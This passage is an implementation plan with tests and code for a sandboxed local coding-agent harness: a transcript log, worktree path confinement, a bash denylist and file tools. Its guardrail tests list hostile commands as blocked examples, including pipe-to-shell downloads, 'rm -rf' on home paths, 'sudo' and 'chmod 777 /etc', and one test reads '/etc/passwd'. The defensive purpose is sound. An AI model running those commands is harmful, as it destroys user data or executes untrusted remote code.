# localagent Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A stdlib-only Python CLI that runs one coding task against a local LM Studio model in an agentic tool-use loop inside an isolated git worktree, producing a reviewable diff and JSONL transcript.

**Architecture:** OpenAI tool-calling loop over `POST http://localhost:1234/v1/chat/completions`. Six tools (read/write/edit/list/grep/bash) confined to a git worktree; bash additionally guarded by a denylist and minimal env. No auto-commit — Claude reviews the worktree diff afterwards. Spec: `docs/superpowers/specs/2026-08-13-localagent-design.md`.

**Tech Stack:** Python 3.9 stdlib only (urllib, subprocess, pathlib, argparse, json). Dev-only dep: pytest.

## Global Constraints

- Python 3.9.6 compatible (system Python; Xcode build). No third-party runtime deps. No venv. Every module starts with `from __future__ import annotations`.
- Type hints may use modern syntax (`list[str]`, `str | None`) ONLY inside annotations (the `__future__` import makes them strings); runtime code must use 3.9-safe constructs — no `match`, no runtime `X | Y` unions.
- Repo root: `~/repos/localagent`. Package dir: `localagent/`. Tests: `tests/`.
- All commits: conventional messages, NO Co-Authored-By / attribution lines.
- pytest is not installed initially — Task 1 installs it via `python3 -m pip install --user pytest`.
- Run all commands from `~/repos/localagent` unless a step says otherwise.
- Models: default `qwen/qwen3-coder-next` (65,536-token window), alternate `mistralai/devstral-small-2-2512` (32,768). LM Studio base URL `http://localhost:1234/v1`.

---

### Task 1: Scaffolding + transcript writer

**Files:**
- Create: `pyproject.toml`, `.gitignore`, `localagent/__init__.py`, `localagent/transcript.py`
- Test: `tests/test_transcript.py`

**Interfaces:**
- Produces: `Transcript(path: Path)` with `.write(event: str, **fields) -> None`, `.close() -> None`, and `.path` attribute. Each `write` appends one JSON line `{"ts": <UTC ISO-8601>, "event": <event>, ...fields}` and flushes immediately (tail -f friendly).

- [ ] **Step 1: Install pytest and scaffold**

```bash
cd ~/repos/localagent
python3 -m pip install --user pytest
python3 -m pytest --version   # must print a version
mkdir -p localagent tests
touch localagent/__init__.py tests/__init__.py
```

Write `localagent/__init__.py`:

```python
__version__ = "0.1.0"
```

Write `pyproject.toml`:

```toml
[project]
name = "localagent"
version = "0.1.0"
description = "Agentic tool-use loop harness for local LM Studio models"
requires-python = ">=3.9"

[tool.pytest.ini_options]
markers = ["live: requires a running LM Studio server"]
addopts = "-m 'not live'"
```

Write `.gitignore`:

```
__pycache__/
*.pyc
.pytest_cache/
```

- [ ] **Step 2: Write the failing test**

`tests/test_transcript.py`:

```python
from __future__ import annotations

import json
from pathlib import Path

from localagent.transcript import Transcript


def test_writes_jsonl_events_with_ts(tmp_path: Path):
    t = Transcript(tmp_path / "sub" / "transcript.jsonl")  # parent dirs auto-created
    t.write("run_start", task="do a thing", model="m")
    t.write("assistant", text="hello")
    t.close()

    lines = (tmp_path / "sub" / "transcript.jsonl").read_text().splitlines()
    assert len(lines) == 2
    first = json.loads(lines[0])
    assert first["event"] == "run_start"
    assert first["task"] == "do a thing"
    assert "T" in first["ts"]  # ISO-8601 timestamp

    second = json.loads(lines[1])
    assert second["event"] == "assistant"


def test_flushes_each_line_before_close(tmp_path: Path):
    path = tmp_path / "t.jsonl"
    t = Transcript(path)
    t.write("run_start", task="x")
    # Do NOT close — the line must already be on disk (tail -f contract)
    assert path.read_text().count("\n") == 1
    t.close()
```

- [ ] **Step 3: Run test to verify it fails**

Run: `python3 -m pytest tests/test_transcript.py -v`
Expected: FAIL / error — `ModuleNotFoundError: No module named 'localagent.transcript'`

- [ ] **Step 4: Write minimal implementation**

`localagent/transcript.py`:

```python
from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path


class Transcript:
    """Append-only JSONL event log, flushed per line so `tail -f` works."""

    def __init__(self, path: Path):
        self.path = Path(path)
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._fh = open(self.path, "a", encoding="utf-8")

    def write(self, event: str, **fields) -> None:
        record = {"ts": datetime.now(timezone.utc).isoformat(), "event": event}
        record.update(fields)
        self._fh.write(json.dumps(record, ensure_ascii=False) + "\n")
        self._fh.flush()

    def close(self) -> None:
        self._fh.close()
```

- [ ] **Step 5: Run test to verify it passes**

Run: `python3 -m pytest tests/test_transcript.py -v`
Expected: 2 PASS

- [ ] **Step 6: Commit**

```bash
git add pyproject.toml .gitignore localagent tests
git commit -m "feat: scaffolding and JSONL transcript writer"
```

---

### Task 2: Guardrails — path confinement

**Files:**
- Create: `localagent/guardrails.py`
- Test: `tests/test_guardrails_paths.py`

**Interfaces:**
- Produces: `GuardrailError(Exception)`; `resolve_in_worktree(path_str: str, worktree: Path, writing: bool = False) -> Path` — resolves `path_str` (relative to worktree, or absolute) through symlinks, raises `GuardrailError` with a readable message if the real path lands outside the worktree, or if `writing=True` and the path is inside `.git/`.

- [ ] **Step 1: Write the failing test**

`tests/test_guardrails_paths.py`:

```python
from __future__ import annotations

import os
from pathlib import Path

import pytest

from localagent.guardrails import GuardrailError, resolve_in_worktree


@pytest.fixture()
def worktree(tmp_path: Path) -> Path:
    wt = tmp_path / "wt"
    (wt / ".git").mkdir(parents=True)
    (wt / "src").mkdir()
    (wt / "src" / "a.txt").write_text("hi")
    return wt


def test_relative_path_resolves_inside(worktree: Path):
    p = resolve_in_worktree("src/a.txt", worktree)
    assert p == (worktree / "src" / "a.txt").resolve()


def test_dotdot_escape_rejected(worktree: Path):
    with pytest.raises(GuardrailError):
        resolve_in_worktree("../outside.txt", worktree)


def test_absolute_path_outside_rejected(worktree: Path):
    with pytest.raises(GuardrailError):
        resolve_in_worktree("/etc/hosts", worktree)


def test_absolute_path_inside_allowed(worktree: Path):
    p = resolve_in_worktree(str(worktree / "src" / "a.txt"), worktree)
    assert p == (worktree / "src" / "a.txt").resolve()


def test_symlink_escape_rejected(worktree: Path, tmp_path: Path):
    outside = tmp_path / "secret.txt"
    outside.write_text("secret")
    os.symlink(outside, worktree / "link.txt")
    with pytest.raises(GuardrailError):
        resolve_in_worktree("link.txt", worktree)


def test_git_dir_write_rejected_read_allowed(worktree: Path):
    (worktree / ".git" / "config").write_text("x")
    # reading .git is fine
    resolve_in_worktree(".git/config", worktree)
    # writing is not
    with pytest.raises(GuardrailError):
        resolve_in_worktree(".git/hooks/pre-commit", worktree, writing=True)


def test_nonexistent_target_ok_for_writing(worktree: Path):
    # write_file creates new files; resolution must work for paths that don't exist yet
    p = resolve_in_worktree("src/new/deep/file.txt", worktree, writing=True)
    assert str(p).startswith(str(worktree.resolve()))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_guardrails_paths.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'localagent.guardrails'`

- [ ] **Step 3: Write minimal implementation**

`localagent/guardrails.py`:

```python
from __future__ import annotations

from pathlib import Path


class GuardrailError(Exception):
    """Raised when a tool call violates a containment rule."""


def resolve_in_worktree(path_str: str, worktree: Path, writing: bool = False) -> Path:
    """Resolve a tool-supplied path and require it to land inside the worktree.

    Symlinks are followed (Path.resolve), so a link pointing outside is caught.
    For not-yet-existing paths, resolve() still normalizes .. components.
    """
    wt = worktree.resolve()
    raw = Path(path_str)
    candidate = raw if raw.is_absolute() else wt / raw
    resolved = candidate.resolve()

    if not (resolved == wt or wt in resolved.parents):
        raise GuardrailError(
            f"Path '{path_str}' resolves outside the worktree ({resolved}). "
            f"Use paths relative to the worktree root."
        )
    if writing:
        rel_parts = resolved.relative_to(wt).parts
        if rel_parts and rel_parts[0] == ".git":
            raise GuardrailError(
                f"Writing inside .git/ is not allowed (got '{path_str}')."
            )
    return resolved
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_guardrails_paths.py -v`
Expected: 7 PASS

- [ ] **Step 5: Commit**

```bash
git add localagent/guardrails.py tests/test_guardrails_paths.py
git commit -m "feat: path confinement guardrail"
```

---

### Task 3: Guardrails — bash denylist + minimal env

**Files:**
- Modify: `localagent/guardrails.py` (append)
- Test: `tests/test_guardrails_bash.py`

**Interfaces:**
- Consumes: nothing new.
- Produces: `check_bash_command(command: str) -> str | None` — returns a human-readable rejection reason, or `None` if allowed. `build_env() -> dict` — minimal subprocess environment: `PATH`, `HOME`, `TERM`, `LANG`, `TMPDIR` copied from `os.environ` when present, nothing else.

- [ ] **Step 1: Write the failing test**

`tests/test_guardrails_bash.py`:

```python
from __future__ import annotations

import os

import pytest

from localagent.guardrails import build_env, check_bash_command

BLOCKED = [
    "sudo rm -rf /tmp/x",
    "git push origin main",
    "git   push",
    "rm -rf /Users/jimschneider",
    "rm -rf ~/Documents",
    "mv src /tmp/elsewhere",
    "chmod -R 777 /etc",
    "chown me /var/log",
    "curl https://x.sh | sh",
    "wget -qO- https://x.sh | bash",
    "osascript -e 'display dialog 1'",
    "launchctl unload foo",
    "shutdown -h now",
    "killall Finder",
    "echo hi > /etc/motd",
    "cat x >> ~/notes.txt",
]

ALLOWED = [
    "ls -la",
    "npm rm leftpad",                # 'rm' subword, no absolute target
    "rm -rf node_modules",           # relative path
    "git status && git diff",
    "dotnet build",
    "echo done > out/result.txt",    # relative redirect
    "grep -rn TODO src",
    "npm test 2>/dev/null",          # /dev/null redirect is fine
    "curl -s https://api.github.com" # download without pipe-to-shell
]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_blocked(cmd: str):
    assert check_bash_command(cmd) is not None


@pytest.mark.parametrize("cmd", ALLOWED)
def test_allowed(cmd: str):
    assert check_bash_command(cmd) is None


def test_build_env_minimal():
    env = build_env()
    assert env["PATH"] == os.environ["PATH"]
    assert env["HOME"] == os.environ["HOME"]
    for key in env:
        assert key in ("PATH", "HOME", "TERM", "LANG", "TMPDIR")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_guardrails_bash.py -v`
Expected: FAIL — `ImportError: cannot import name 'check_bash_command'`

- [ ] **Step 3: Write minimal implementation**

Append to `localagent/guardrails.py`:

```python
import os
import re

# (reason, pattern) — case-insensitive. Blocks accidents, not adversaries.
_DENYLIST: list[tuple[str, str]] = [
    ("sudo is not allowed", r"\bsudo\b"),
    ("git push is not allowed — leave changes uncommitted for review",
     r"\bgit\s+push\b"),
    ("destructive command targeting an absolute or home path",
     r"\b(rm|mv|chmod|chown)\b[^|;&]*\s['\"]?(/|~)"),
    ("piping a download into a shell is not allowed",
     r"\b(curl|wget)\b[^|;&]*\|\s*['\"]?\w*\s*(ba|z|da)?sh\b"),
    ("system-control commands are not allowed",
     r"\b(osascript|launchctl|shutdown|reboot|killall)\b"),
    ("redirecting output to an absolute or home path outside the worktree",
     r">>?\s*['\"]?(?!/dev/null)(/|~)"),
]

_COMPILED = [(reason, re.compile(pat, re.IGNORECASE)) for reason, pat in _DENYLIST]


def check_bash_command(command: str) -> str | None:
    """Return a rejection reason if the command matches the denylist, else None."""
    for reason, rx in _COMPILED:
        if rx.search(command):
            return f"BLOCKED: {reason}. Rework the command to stay inside the worktree."
    return None


def build_env() -> dict:
    """Minimal env for bash subprocesses — parent shell secrets are not inherited."""
    keep = ("PATH", "HOME", "TERM", "LANG", "TMPDIR")
    return {k: os.environ[k] for k in keep if k in os.environ}
```

Note: `list[tuple[str, str]]` in the module-level assignment is a *runtime* annotation on a variable — on 3.9 with `from __future__ import annotations` variable annotations are also not evaluated, so this is safe. If in doubt, drop the annotation entirely.

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_guardrails_bash.py -v`
Expected: all PASS (25 tests + prior file's 7 still green: run `python3 -m pytest -v` to confirm no regressions)

- [ ] **Step 5: Commit**

```bash
git add localagent/guardrails.py tests/test_guardrails_bash.py
git commit -m "feat: bash denylist and minimal subprocess env"
```

---

### Task 4: File tools (read / write / edit / list / grep)

**Files:**
- Create: `localagent/tools.py`
- Test: `tests/test_tools_files.py`

**Interfaces:**
- Consumes: `resolve_in_worktree`, `GuardrailError` from `localagent.guardrails`.
- Produces: module-level `MAX_RESULT_CHARS = 8000`; functions (all return `str`, never raise — guardrail/IO errors come back as readable strings starting with `ERROR:` so the model can self-correct):
  - `read_file(worktree: Path, path: str, offset: int = 0, limit: int = 400) -> str` — numbered lines (`f"{n:6}\t{line}"`), truncation note when capped.
  - `write_file(worktree: Path, path: str, content: str) -> str` — creates parents; returns `"Wrote <n> bytes to <path>"`.
  - `edit_file(worktree: Path, path: str, old_string: str, new_string: str) -> str` — exact match, must occur exactly once.
  - `list_dir(worktree: Path, path: str = ".") -> str` — sorted; dirs suffixed `/`; files show byte size.
  - `grep(worktree: Path, pattern: str, path: str = ".", glob: str | None = None) -> str` — `rg` binary if `shutil.which("rg")`, else `grep -rn`; "No matches found." on empty.

- [ ] **Step 1: Write the failing test**

`tests/test_tools_files.py`:

```python
from __future__ import annotations

from pathlib import Path

import pytest

from localagent import tools


@pytest.fixture()
def wt(tmp_path: Path) -> Path:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "app.py").write_text("def main():\n    return 42\n")
    (tmp_path / "README.md").write_text("# Demo\n")
    return tmp_path


def test_read_file_numbers_lines(wt: Path):
    out = tools.read_file(wt, "src/app.py")
    assert "     1\tdef main():" in out
    assert "     2\t    return 42" in out


def test_read_file_offset_limit(wt: Path):
    out = tools.read_file(wt, "src/app.py", offset=1, limit=1)
    assert "def main" not in out
    assert "return 42" in out


def test_read_file_missing_is_error_string(wt: Path):
    out = tools.read_file(wt, "nope.py")
    assert out.startswith("ERROR:")


def test_read_file_escape_is_error_string(wt: Path):
    out = tools.read_file(wt, "../../etc/passwd")
    assert out.startswith("ERROR:")


def test_write_file_creates_parents(wt: Path):
    out = tools.write_file(wt, "deep/new/file.txt", "hello")
    assert (wt / "deep" / "new" / "file.txt").read_text() == "hello"
    assert "Wrote 5 bytes" in out


def test_write_file_git_blocked(wt: Path):
    (wt / ".git").mkdir()
    out = tools.write_file(wt, ".git/hooks/pre-commit", "#!/bin/sh")
    assert out.startswith("ERROR:")


def test_edit_file_unique_match(wt: Path):
    out = tools.edit_file(wt, "src/app.py", "return 42", "return 43")
    assert "Edited" in out
    assert "return 43" in (wt / "src" / "app.py").read_text()


def test_edit_file_no_match(wt: Path):
    out = tools.edit_file(wt, "src/app.py", "not here", "x")
    assert out.startswith("ERROR:") and "0 times" in out


def test_edit_file_multiple_matches(wt: Path):
    (wt / "dup.txt").write_text("aa\naa\n")
    out = tools.edit_file(wt, "dup.txt", "aa", "bb")
    assert out.startswith("ERROR:") and "2 times" in out


def test_list_dir(wt: Path):
    out = tools.list_dir(wt, ".")
    assert "src/" in out
    assert "README.md" in out


def test_grep_finds_pattern(wt: Path):
    out = tools.grep(wt, "return 42")
    assert "app.py" in out


def test_grep_no_match(wt: Path):
    out = tools.grep(wt, "zzz_not_present")
    assert "No matches" in out


def test_result_cap(wt: Path):
    (wt / "big.txt").write_text("x" * 50000)
    out = tools.read_file(wt, "big.txt")
    assert len(out) <= tools.MAX_RESULT_CHARS + 200  # cap + truncation note
    assert "truncated" in out.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_tools_files.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'localagent.tools'`

- [ ] **Step 3: Write minimal implementation**

`localagent/tools.py`:

```python
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from .guardrails import GuardrailError, resolve_in_worktree

MAX_RESULT_CHARS = 8000


def _cap(text: str, cap: int = MAX_RESULT_CHARS, note: str = "") -> str:
    if len(text) <= cap:
        return text
    suffix = f"\n[output truncated at {cap} chars{note}]"
    return text[:cap] + suffix


def read_file(worktree: Path, path: str, offset: int = 0, limit: int = 400) -> str:
    try:
        p = resolve_in_worktree(path, worktree)
        lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
    except GuardrailError as e:
        return f"ERROR: {e}"
    except OSError as e:
        return f"ERROR: cannot read '{path}': {e}"
    window = lines[offset : offset + limit]
    numbered = "\n".join(f"{i:6}\t{line}" for i, line in enumerate(window, offset + 1))
    if offset + limit < len(lines):
        numbered += (
            f"\n[showing lines {offset + 1}-{offset + len(window)} of {len(lines)}; "
            f"re-run with offset={offset + limit} for more]"
        )
    return _cap(numbered, note=" — re-run with offset/limit to see more")


def write_file(worktree: Path, path: str, content: str) -> str:
    try:
        p = resolve_in_worktree(path, worktree, writing=True)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    except GuardrailError as e:
        return f"ERROR: {e}"
    except OSError as e:
        return f"ERROR: cannot write '{path}': {e}"
    return f"Wrote {len(content.encode('utf-8'))} bytes to {path}"


def edit_file(worktree: Path, path: str, old_string: str, new_string: str) -> str:
    try:
        p = resolve_in_worktree(path, worktree, writing=True)
        text = p.read_text(encoding="utf-8")
    except GuardrailError as e:
        return f"ERROR: {e}"
    except OSError as e:
        return f"ERROR: cannot read '{path}': {e}"
    count = text.count(old_string)
    if count != 1:
        return (
            f"ERROR: old_string occurs {count} times in {path}; it must occur exactly "
            f"once. Include more surrounding context to make it unique."
        )
    p.write_text(text.replace(old_string, new_string, 1), encoding="utf-8")
    return f"Edited {path}"


def list_dir(worktree: Path, path: str = ".") -> str:
    try:
        p = resolve_in_worktree(path, worktree)
        entries = sorted(p.iterdir(), key=lambda e: e.name)
    except GuardrailError as e:
        return f"ERROR: {e}"
    except OSError as e:
        return f"ERROR: cannot list '{path}': {e}"
    rows = []
    for e in entries:
        if e.is_dir():
            rows.append(f"{e.name}/")
        else:
            rows.append(f"{e.name}  ({e.stat().st_size} bytes)")
    return _cap("\n".join(rows) or "(empty directory)")


def grep(worktree: Path, pattern: str, path: str = ".", glob: str | None = None) -> str:
    try:
        p = resolve_in_worktree(path, worktree)
    except GuardrailError as e:
        return f"ERROR: {e}"
    rg = shutil.which("rg")
    if rg:
        cmd = [rg, "-n", "--no-heading", "-M", "300", "-e", pattern]
        if glob:
            cmd += ["-g", glob]
        cmd.append(str(p))
    else:
        cmd = ["grep", "-rn", "-e", pattern]
        if glob:
            cmd += [f"--include={glob}"]
        cmd.append(str(p))
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    except subprocess.TimeoutExpired:
        return "ERROR: grep timed out after 30s — narrow the pattern or path."
    if res.returncode not in (0, 1):
        return f"ERROR: grep failed: {res.stderr.strip()[:500]}"
    if not res.stdout.strip():
        return "No matches found."
    # strip the worktree prefix so results read as relative paths
    out = res.stdout.replace(str(worktree.resolve()) + "/", "")
    return _cap(out, note=" — narrow the pattern or path for full results")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_tools_files.py -v`
Expected: 14 PASS

- [ ] **Step 5: Commit**

```bash
git add localagent/tools.py tests/test_tools_files.py
git commit -m "feat: confined file tools (read/write/edit/list/grep)"
```

---

### Task 5: Bash tool + ToolExecutor dispatch + OpenAI schemas

**Files:**
- Modify: `localagent/tools.py` (append)
- Test: `tests/test_tools_bash.py`

**Interfaces:**
- Consumes: `check_bash_command`, `build_env` from `localagent.guardrails`; `Transcript` from `localagent.transcript`.
- Produces (all appended to `localagent/tools.py`):
  - `bash(worktree: Path, command: str, timeout: int = 120) -> str` — timeout clamped to [1, 600]; returns `"exit code: <rc>\n<combined stdout+stderr>"` capped at 10,000 chars; denylist hit returns the `BLOCKED:` reason string.
  - `TOOL_SCHEMAS: list` — six OpenAI function schemas, exactly as listed in Step 3.
  - `class ToolExecutor:` with `__init__(self, worktree: Path, transcript=None)` and `execute(self, name: str, args: dict) -> str`. Unknown tool name → raises `KeyError` (the runner treats that as a model failure). Denylist blocks are logged to the transcript as `guardrail_block` events when a transcript is present.

- [ ] **Step 1: Write the failing test**

`tests/test_tools_bash.py`:

```python
from __future__ import annotations

import json
from pathlib import Path

import pytest

from localagent.tools import TOOL_SCHEMAS, ToolExecutor, bash
from localagent.transcript import Transcript


@pytest.fixture()
def wt(tmp_path: Path) -> Path:
    (tmp_path / "hello.txt").write_text("hi\n")
    return tmp_path


def test_bash_runs_in_worktree_cwd(wt: Path):
    out = bash(wt, "pwd && cat hello.txt")
    assert "exit code: 0" in out
    assert str(wt.resolve()) in out
    assert "hi" in out


def test_bash_nonzero_exit_reported(wt: Path):
    out = bash(wt, "exit 3")
    assert "exit code: 3" in out


def test_bash_blocked_command(wt: Path):
    out = bash(wt, "sudo ls")
    assert out.startswith("BLOCKED:")


def test_bash_timeout(wt: Path):
    out = bash(wt, "sleep 5", timeout=1)
    assert "timed out" in out.lower()


def test_bash_env_is_minimal(wt: Path, monkeypatch):
    monkeypatch.setenv("MY_SECRET", "sekrit")
    out = bash(wt, "env")
    assert "PATH=" in out
    assert "MY_SECRET" not in out  # parent env not inherited wholesale


def test_schemas_shape():
    names = {s["function"]["name"] for s in TOOL_SCHEMAS}
    assert names == {"read_file", "write_file", "edit_file", "list_dir", "grep", "bash"}
    for s in TOOL_SCHEMAS:
        assert s["type"] == "function"
        assert "parameters" in s["function"]


def test_executor_dispatch_and_unknown(wt: Path):
    ex = ToolExecutor(wt)
    assert "hi" in ex.execute("read_file", {"path": "hello.txt"})
    with pytest.raises(KeyError):
        ex.execute("format_disk", {})


def test_executor_logs_guardrail_block(wt: Path, tmp_path: Path):
    t = Transcript(tmp_path / "log.jsonl")
    ex = ToolExecutor(wt, transcript=t)
    out = ex.execute("bash", {"command": "git push"})
    t.close()
    assert out.startswith("BLOCKED:")
    events = [json.loads(l) for l in (tmp_path / "log.jsonl").read_text().splitlines()]
    assert any(e["event"] == "guardrail_block" for e in events)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_tools_bash.py -v`
Expected: FAIL — `ImportError: cannot import name 'TOOL_SCHEMAS'`

- [ ] **Step 3: Write minimal implementation**

Append to `localagent/tools.py`:

```python
from .guardrails import build_env, check_bash_command

MAX_BASH_CHARS = 10000


def bash(worktree: Path, command: str, timeout: int = 120) -> str:
    reason = check_bash_command(command)
    if reason:
        return reason  # starts with "BLOCKED:"
    timeout = max(1, min(int(timeout), 600))
    try:
        res = subprocess.run(
            ["bash", "-c", command],
            cwd=str(worktree),
            env=build_env(),
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"ERROR: command timed out after {timeout}s."
    combined = (res.stdout + res.stderr).strip()
    return _cap(f"exit code: {res.returncode}\n{combined}", cap=MAX_BASH_CHARS)


def _param(props: dict, required: list) -> dict:
    return {"type": "object", "properties": props, "required": required}


TOOL_SCHEMAS = [
    {"type": "function", "function": {
        "name": "read_file",
        "description": "Read a file, returning numbered lines. Large files are "
                       "windowed; use offset/limit to page through.",
        "parameters": _param({
            "path": {"type": "string", "description": "Path relative to worktree root"},
            "offset": {"type": "integer", "description": "0-based first line, default 0"},
            "limit": {"type": "integer", "description": "Max lines, default 400"},
        }, ["path"])}},
    {"type": "function", "function": {
        "name": "write_file",
        "description": "Create or overwrite a file. Parent directories are created.",
        "parameters": _param({
            "path": {"type": "string"},
            "content": {"type": "string"},
        }, ["path", "content"])}},
    {"type": "function", "function": {
        "name": "edit_file",
        "description": "Replace old_string with new_string in a file. old_string "
                       "must occur exactly once — include surrounding context.",
        "parameters": _param({
            "path": {"type": "string"},
            "old_string": {"type": "string"},
            "new_string": {"type": "string"},
        }, ["path", "old_string", "new_string"])}},
    {"type": "function", "function": {
        "name": "list_dir",
        "description": "List a directory's entries (dirs end with /).",
        "parameters": _param({"path": {"type": "string", "description": "Default '.'"}}, [])}},
    {"type": "function", "function": {
        "name": "grep",
        "description": "Search file contents with a regex. Optional glob filter "
                       "like '*.cs' or '*.tsx'.",
        "parameters": _param({
            "pattern": {"type": "string"},
            "path": {"type": "string", "description": "Default '.'"},
            "glob": {"type": "string"},
        }, ["pattern"])}},
    {"type": "function", "function": {
        "name": "bash",
        "description": "Run a shell command in the worktree (cwd is the worktree "
                       "root). Use for builds/tests/git-status, NEVER for editing "
                       "files. 120s default timeout, 600s max.",
        "parameters": _param({
            "command": {"type": "string"},
            "timeout": {"type": "integer", "description": "Seconds, default 120, max 600"},
        }, ["command"])}},
]


class ToolExecutor:
    """Dispatches validated tool calls. Unknown names raise KeyError."""

    def __init__(self, worktree: Path, transcript=None):
        self.worktree = worktree
        self.transcript = transcript
        self._table = {
            "read_file": read_file,
            "write_file": write_file,
            "edit_file": edit_file,
            "list_dir": list_dir,
            "grep": grep,
            "bash": bash,
        }

    def execute(self, name: str, args: dict) -> str:
        fn = self._table[name]  # KeyError → runner counts a model failure
        result = fn(self.worktree, **args)
        if result.startswith("BLOCKED:") and self.transcript is not None:
            self.transcript.write("guardrail_block", tool=name, args=args, reason=result)
        return result
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_tools_bash.py -v` then `python3 -m pytest`
Expected: all PASS, no regressions

- [ ] **Step 5: Commit**

```bash
git add localagent/tools.py tests/test_tools_bash.py
git commit -m "feat: guarded bash tool, executor dispatch, OpenAI schemas"
```

---

### Task 6: Workspace — preflight, slug, worktree, repo context

**Files:**
- Create: `localagent/workspace.py`
- Test: `tests/test_workspace.py`

**Interfaces:**
- Consumes: nothing from other modules (pure git/subprocess + pathlib).
- Produces:
  - `class WorkspaceError(Exception)`
  - `preflight_repo(repo: Path) -> None` — raises `WorkspaceError` unless `repo` is a git repo with ≥1 commit.
  - `make_slug(task: str, now: datetime) -> str` — first 5 words, lowercased, non-alnum → `-`, collapsed, max 40 chars, plus `-MMDDHHMM` suffix.
  - `create_worktree(repo: Path, slug: str, branch_from: str | None) -> Path` — runs `git -C <repo> worktree add -b localagent/<slug> .worktrees/la-<slug> <branch_from or HEAD>`; returns the worktree path; raises `WorkspaceError` on git failure (captures stderr).
  - `ensure_worktrees_excluded(repo: Path) -> None` — appends `.worktrees/` to `<gitdir>/info/exclude` if not already present (uses `git -C <repo> rev-parse --git-dir` to locate it).
  - `load_repo_context(repo: Path) -> str | None` — content of `CLAUDE.md` else `AGENTS.md` at repo root, else `None`.

- [ ] **Step 1: Write the failing test**

`tests/test_workspace.py`:

```python
from __future__ import annotations

import subprocess
from datetime import datetime
from pathlib import Path

import pytest

from localagent.workspace import (
    WorkspaceError,
    create_worktree,
    ensure_worktrees_excluded,
    load_repo_context,
    make_slug,
    preflight_repo,
)


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), *args], capture_output=True, text=True, check=True
    ).stdout


@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    r = tmp_path / "repo"
    r.mkdir()
    _git(r, "init", "-b", "main")
    _git(r, "config", "user.email", "t@t")
    _git(r, "config", "user.name", "t")
    (r / "f.txt").write_text("hello")
    _git(r, "add", ".")
    _git(r, "commit", "-m", "init")
    return r


def test_preflight_ok(repo: Path):
    preflight_repo(repo)  # no raise


def test_preflight_not_git(tmp_path: Path):
    with pytest.raises(WorkspaceError):
        preflight_repo(tmp_path)


def test_preflight_no_commits(tmp_path: Path):
    r = tmp_path / "empty"
    r.mkdir()
    _git(r, "init")
    with pytest.raises(WorkspaceError):
        preflight_repo(r)


def test_make_slug():
    now = datetime(2026, 8, 14, 11, 9)
    slug = make_slug("Add unit tests for the invoice footer!", now)
    assert slug == "add-unit-tests-for-the-08141109"


def test_create_worktree(repo: Path):
    wt = create_worktree(repo, "demo-08141109", None)
    assert wt == repo / ".worktrees" / "la-demo-08141109"
    assert (wt / "f.txt").read_text() == "hello"
    branches = _git(repo, "branch", "--list", "localagent/demo-08141109")
    assert "localagent/demo-08141109" in branches


def test_create_worktree_bad_ref(repo: Path):
    with pytest.raises(WorkspaceError):
        create_worktree(repo, "x-08141109", "no-such-branch")


def test_ensure_worktrees_excluded_idempotent(repo: Path):
    ensure_worktrees_excluded(repo)
    ensure_worktrees_excluded(repo)
    exclude = repo / ".git" / "info" / "exclude"
    assert exclude.read_text().count(".worktrees/") == 1


def test_load_repo_context(repo: Path):
    assert load_repo_context(repo) is None
    (repo / "AGENTS.md").write_text("agents rules")
    assert load_repo_context(repo) == "agents rules"
    (repo / "CLAUDE.md").write_text("claude rules")  # CLAUDE.md wins
    assert load_repo_context(repo) == "claude rules"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_workspace.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'localagent.workspace'`

- [ ] **Step 3: Write minimal implementation**

`localagent/workspace.py`:

```python
from __future__ import annotations

import re
import subprocess
from datetime import datetime
from pathlib import Path


class WorkspaceError(Exception):
    """Raised when the target repo or worktree operation is unusable."""


def _git(repo: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(repo), *args], capture_output=True, text=True
    )


def preflight_repo(repo: Path) -> None:
    if not repo.is_dir():
        raise WorkspaceError(f"{repo} is not a directory")
    if _git(repo, "rev-parse", "--is-inside-work-tree").returncode != 0:
        raise WorkspaceError(f"{repo} is not a git repository")
    if _git(repo, "rev-parse", "HEAD").returncode != 0:
        raise WorkspaceError(f"{repo} has no commits (worktrees need a base ref)")


def make_slug(task: str, now: datetime) -> str:
    words = re.sub(r"[^a-z0-9\s-]", "", task.lower()).split()[:5]
    base = re.sub(r"-+", "-", "-".join(words))[:40].strip("-") or "task"
    return f"{base}-{now.strftime('%m%d%H%M')}"


def create_worktree(repo: Path, slug: str, branch_from: str | None) -> Path:
    rel = Path(".worktrees") / f"la-{slug}"
    ref = branch_from or "HEAD"
    res = _git(repo, "worktree", "add", "-b", f"localagent/{slug}", str(rel), ref)
    if res.returncode != 0:
        raise WorkspaceError(f"git worktree add failed: {res.stderr.strip()}")
    return repo / rel


def ensure_worktrees_excluded(repo: Path) -> None:
    res = _git(repo, "rev-parse", "--git-dir")
    if res.returncode != 0:
        raise WorkspaceError(f"cannot locate git dir for {repo}")
    git_dir = Path(res.stdout.strip())
